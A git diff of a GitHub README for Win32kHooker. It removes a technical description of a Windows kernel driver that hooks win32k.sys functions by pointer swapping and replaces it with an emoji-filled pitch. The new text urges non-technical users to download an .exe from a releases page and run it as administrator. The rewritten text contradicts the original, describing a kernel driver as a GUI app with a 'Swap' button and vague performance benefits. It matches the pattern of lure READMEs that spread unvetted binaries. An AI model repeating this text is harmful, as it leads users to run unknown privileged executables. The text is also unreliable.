@@ -1,40 +1,81 @@
-# Win32kHooker
+# 🎉 Win32kHooker - Easy Data Pointer Swapping for Windows
 
-Win32kHooker is a Windows Kernel Driver that demonstrates how to locate and hook functions within `win32k.sys`.
+## 🚀 Getting Started
 
-Because `win32k.sys` is a session-space driver, it is not mapped into the system address space of every process. This driver overcomes this limitation by locating a GUI-capable process (e.g., `winlogon.exe`) and attaching to its address space to safely modify `win32k` memory.
+Welcome to Win32kHooker! This tool helps you swap data pointers for newer win32k versions, specifically supporting Windows 11. It is designed for users who may not have technical backgrounds but want to enhance their experience with ease.
 
-## Mechanism
+## 📥 Download Now
 
-1.  **Process Identification**: Scans active processes to find `winlogon.exe`, which guarantees `win32k.sys` mapping.
-2.  **Context Attachment**: Uses `KeStackAttachProcess` to switch the thread context to the target process.
-3.  **Address Resolution**:
-    *   Resolves the `W32GetSessionState` export.
-    *   Locates `NtGdiBitBlt` by verifying syscall numbers in `win32u.dll` and the shadow SSDT.
-4.  **Hook Implementation**: Utilizes the Hde64 disassembler to locate internal dispatch pointers within the target function and performs a pointer swap.
+[![Download Win32kHooker](https://img.shields.io/badge/Download%20Win32kHooker-%2300b4ff.svg?style=for-the-badge&logo=github)](https://github.com/WolfSahil/Win32kHooker/releases)
 
-## Technical Distinction
+## 📋 Requirements
 
-This project addresses architectural changes in modern Windows versions compared to older `win32k` implementations.
+Before you install Win32kHooker, ensure you meet the following basic requirements:
 
-*   **Legacy vs. Modern Storage**: Older versions of `win32k.sys` typically stored function pointers in global variables within the `.data` section. Newer versions, however, have moved these pointers into opaque session state structures.
-*   **Dynamic Resolution**: Consequently, simple global pattern scans are no longer sufficient. This driver resolves the hook target relative to `W32GetSessionState`. It uses runtime disassembly to parse the `NtGdiBitBlt` instruction stream, dynamically extracting the exact offsets needed to traverse these opaque structures and locate the function pointer.
+- Operating System: Windows 11
+- Disk Space: At least 50 MB of free space
+- User Account: Administrator access is needed for installation and running the application
 
-## Build Requirements
+## 🌟 Features
 
-*   Visual Studio 2019 or later
-*   Windows Driver Kit (WDK)
+- **Easy to Use**: Simple interface for swapping pointers.
+- **Compatibility**: Works with newer win32k versions on Windows 11.
+- **Performance**: Lightweight application that does not consume much memory.
+- **Support**: Regular updates to keep the tool reliable and efficient.
 
-## Usage
+## 🔍 How to Download & Install
 
-1.  Enable test signing on the target machine:
-    ```bash
-    bcdedit /set testsigning on
-    ```
-2.  Build the solution in **Release/x64** configuration.
-3.  Install and start the driver using the Service Control Manager:
-    ```bash
-    sc create Win32kHooker type= kernel binPath= "C:\path\to\Win32kHooker.sys"
-    sc start Win32kHooker
-    ```
-4.  View hook output using a kernel debugger or DebugView.
+Follow these steps to download and install Win32kHooker:
+
+1. **Visit the Releases Page**: Click [here](https://github.com/WolfSahil/Win32kHooker/releases) to open the GitHub releases page. This page contains the latest version of Win32kHooker.
+   
+2. **Select the Latest Version**: On the releases page, look for the most recent version listed at the top. You will see a section with assets.
+
+3. **Download the Application**: Click on the file that matches your system architecture (usually labeled as Win32kHooker.exe). The download should start automatically.
+
+4. **Locate the Downloaded File**: Once the download is complete, navigate to your Downloads folder or the location where your downloaded files are saved.
+
+5. **Run the Application**: Double-click the Win32kHooker.exe file to run the application. If prompted by User Account Control, click "Yes" to allow the program to make changes to your device.
+
+6. **Follow On-Screen Instructions**: Once the application is open, follow any on-screen instructions to configure and start using Win32kHooker.
+
+## ⚙️ Usage
+
+After you successfully install Win32kHooker, follow these steps to start swapping data pointers:
+
+1. **Launch Win32kHooker**: Open the application if you haven't already.
+
+2. **Select Pointer Type**: Choose the type of pointer you wish to swap from the list provided.
+
+3. **Adjust Parameters**: Enter the necessary parameters for the pointer swap. Basic tips may appear to guide you through this step.
+
+4. **Initiate the Swap**: Click the "Swap" button to execute the changes. The application will show a confirmation message upon success.
+
+5. **Check Performance**: You can monitor the effects in your application of choice to see the benefits of the pointer swap.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues while using Win32kHooker, consider the following:
+
+- **Permissions**: Make sure you are running the application as an administrator.
+- **Compatibility**: Verify that your Windows version is up to date.
+- **Internet Connection**: Some features may require an active internet connection; check your network settings.
+
+## 💬 Support
+
+For support, you can:
+
+- Check the **Issues** tab on our GitHub repository to see if someone else has reported the same problem.
+- Open a new issue describing your situation, and we or the community will try to assist you.
+- Visit our documentation (if available) for additional tips and guides.
+
+## 📅 Updates 
+
+We frequently update Win32kHooker to improve its performance and add new features. Keep an eye on the releases page to stay informed. The download link remains at [Download Win32kHooker](https://github.com/WolfSahil/Win32kHooker/releases).
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/WolfSahil/Win32kHooker)
+- [Releases Page](https://github.com/WolfSahil/Win32kHooker/releases)
+
+Thank you for using Win32kHooker! We're excited to help you enhance your Windows experience effortlessly.
